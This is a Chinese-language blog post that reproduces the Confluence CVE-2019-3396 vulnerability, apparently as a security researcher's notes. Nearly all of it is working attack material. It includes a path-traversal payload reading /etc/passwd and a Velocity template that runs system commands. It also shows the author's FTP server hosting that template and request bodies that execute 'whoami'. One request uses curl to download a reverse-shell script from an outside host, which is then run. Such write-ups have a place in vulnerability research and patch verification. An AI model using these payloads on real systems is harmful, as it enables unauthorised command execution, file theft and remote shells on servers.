---
layout: post
toc: true
title: "「Src」:Confluence漏洞复现总结"
date: 2020-07-23
author: Bin4xin
categories:
    - blog
    - 笔记
    - src
    - CVE
    - 信息搜集
permalink: /blog/2020/Confluence/vuln-Cve/
---


#### Confluence未授权RCE (CVE-2019-3396)
文件读取：
```bash
url:/confluence/rest/tinymce/1/macro/preview

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../../../../../etc/passwd"}}}
```

##### RCE漏洞：
生成`cmd.vm`文件放在自己的服务器上。
```bash
cat cmd.vm
#set ($e="exp")
#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $e.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end
```
这个漏洞是相当于一个远程文件包含的原理，所以下面跑一个ftp然后在post包里包含，最后输出cmd执行命令即可。
```bash
python3 -m pyftpdlib -p 2121
[I 2020-07-23 15:47:58] concurrency model: async
[I 2020-07-23 15:47:58] masquerade (NAT) address: None
[I 2020-07-23 15:47:58] passive ports: None
[I 2020-07-23 15:47:58] >>> starting FTP server on 0.0.0.0:2121, pid=25460 <<<
```
```bash
执行命令：
{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"ftp://www.chihou.pro:2121/cmd.vm","cmd":"whoami"}}}

下载shell反弹：
{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"ftp://www.chihou.pro:2121/cmd.vm","cmd":"curl -o /tmp/nc.py ftp://www.chihou.pro:2121/nc.py"}}}

"python /tmp/nc.py"
```


